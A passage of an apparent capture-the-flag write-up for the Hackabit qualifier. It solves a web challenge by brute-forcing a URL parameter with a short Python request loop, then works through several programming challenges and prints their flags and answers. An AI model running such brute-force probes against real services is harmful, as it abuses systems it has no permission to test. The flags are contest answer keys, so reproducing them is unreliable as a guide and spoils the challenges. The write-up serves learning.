  &lt;img src=&#34;./img/2outof4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;And this is how you set the header:&lt;/p&gt;

  &lt;img src=&#34;./img/headers.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;



  &lt;img src=&#34;./img/notyet.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Now we just need to brute force numbers 1-100 for the 2nd check! I just automated this with a simple script like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://fsiybpfkid.qualifier.hackabit.com/brain?my-int=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(resp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass-icn&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text: &lt;span style=&#34;color:#75715e&#34;&gt;# check if pass icon is in the response&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(url)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get 72 as the secret number.&lt;/p&gt;
&lt;p&gt;Adding it as another parameter with &lt;code&gt;&amp;amp;my-int=72&lt;/code&gt; (&lt;code&gt;&amp;amp;&lt;/code&gt; for multiple URL paramters) in burpsuite we get the flag!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{insaayne_in_da_membrain}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/insane.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h1 id=&#34;3-programming&#34;&gt;3. Programming&lt;/h1&gt;
&lt;h1 id=&#34;blobs-75&#34;&gt;Blobs (75)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Hey there navigator, its time to follow some directions. Take your challenge input (file) and start at the initial position, such as the below x=52, y=-31. Just like you are on a 2d graph, move in the direction the arrows tell you to. In the below example you end up in the same x position for a difference of 0 and down one for a y difference of -1. Take your final position, in this case 52, -32 and multiply the values together&amp;ndash;that is your final position. The answer to the sample prompt is -1664.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sample prompt:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(52,-31)

↘ ↙ ↘ ↙ ↘ → ← ↖ ← ↗ ↘ ↑ ↑ ↓ ↗ ← → ↙ ↖ ↑
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Simple programming challenge, but I really couldn&amp;rsquo;t be bothered with 8 if/switch case statements so I just used chatGPT, which generated this script and solved it with some modification. Flag &lt;code&gt;-2025780&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#CHAT GPT DID IT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Initial position&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8891&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;directions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(omitted because too long)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Iterate through the directions and update the position&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; directions:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;←&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;→&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;↑&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;↓&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        y &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;↖&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;↗&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;↙&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        y &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;↘&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        x &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        y &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Multiply the final position to get the answer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;answer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(answer)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;buckets-75&#34;&gt;Buckets (75)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Grab the data file and add up all the times danny and elise appear. Multiple those two numbers together, that is your challenge answer.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is yet another programming challenge, even easier than the previous. Use &lt;code&gt;.count()&lt;/code&gt; to count how many times each appears. I couldn&amp;rsquo;t be bothered reading the file, but it would&amp;rsquo;ve been &lt;code&gt;data=open(&#39;filename&#39;,&#39;r&#39;).read()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;omitted because too long&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;count(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;danny&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;count(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;elise&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(a&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pancakes-100&#34;&gt;Pancakes (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Okay we&amp;rsquo;re doing it again, just giving you the flag&amp;hellip; should be easy enough right? Well now lets talk about compiled code. This is the same code compiled for a bunch of different architectures. First, figure out which binary is compatible with your system, then just run it to get the flag!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a zip file with a bunch of binaries! All of them are the same - they are just for different architectures/OS etc. Running any will give the flag. For me, running &lt;code&gt;./binary_18&lt;/code&gt; on WSL gave the flag &lt;code&gt;flag{bob_the_architect}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;linguist-100&#34;&gt;Linguist (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Grab this file and check it out. You&amp;rsquo;ll notice that it&amp;rsquo;s Python3! Python is an interpreted language, you can read the code but it&amp;rsquo;ll be easier to just interpret it!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;This challenge is juxtaposed to Pancake, which is compiled code. Once you interpret this code with the Python3 interpreter, try to read it and see if you understand what it&amp;rsquo;s doing as a bonus!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Given python code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf9\xf3\xfe\xf8\xe4\xeb\xf7\xf6\xec\xc0\xf6\xec\xf1\xeb\xc0\xec\xef\xfe\xf1\xf6\xec\xf7\xc0\xfd\xea\xeb\xc0\xf6\xc0\xec\xeb\xf6\xf3\xf3\xc0\xf1\xfa\xfa\xfb\xc0\xfe\xf1\xc0\xf6\xf1\xeb\xfa\xed\xef\xed\xfa\xeb\xfa\xed\xe2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ANSI&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    COLORS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;30m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;31m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;32m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;33m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;34m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;35m&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;36m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0;37m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;30m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;31m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;32m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;33m&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;34m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;35m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;36m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1;37m&amp;#34;&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    STYLES &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[2m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[3m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[4m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[5m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[7m&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[9m&amp;#34;&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    END &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[0m&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag: print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;choice(ANSI&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;COLORS)&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;chr(i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;ANSI&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;END&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
